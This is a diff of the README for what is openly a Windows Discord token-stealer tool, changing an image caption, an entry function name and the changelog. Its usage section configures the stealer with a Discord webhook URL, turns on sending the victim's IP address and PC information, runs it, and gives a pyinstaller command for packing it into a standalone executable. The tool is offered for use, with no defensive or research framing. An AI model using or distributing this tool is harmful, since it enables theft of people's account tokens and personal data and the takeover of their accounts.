@@ -11,7 +11,7 @@ This version of the grabber only supports **Windows**.
  - Can be used as a library
 
 # Example Message
-![example](https://imgur.com/HfGR31U.png "example")
+![example](https://imgur.com/HfGR31U.png "example of simple mode")
 
 
 # How to use
@@ -26,7 +26,7 @@ token_stealer.WEBHOOK_URL = "https://discord.com/api/webhooks/123456789/fyugYDSt
 token_stealer.PING_ME = True
 token_stealer.SEND_IP = True
 token_stealer.SEND_PC_INFO = True
-token_stealer.main()
+token_stealer.fancy()
 ```
 2.75. Compile the script using pyinstaller (optional but recomended)
 ```
@@ -36,6 +36,6 @@ pyinstaller --onefile --console --name "program_name_here" --no-embed-manifest -
 
 # Changelog:
 ```
-- added embed support
-- added getPremiumType() function
+- a whole lot of code refactoring
+- added simple , fancy , raw functions
 ```
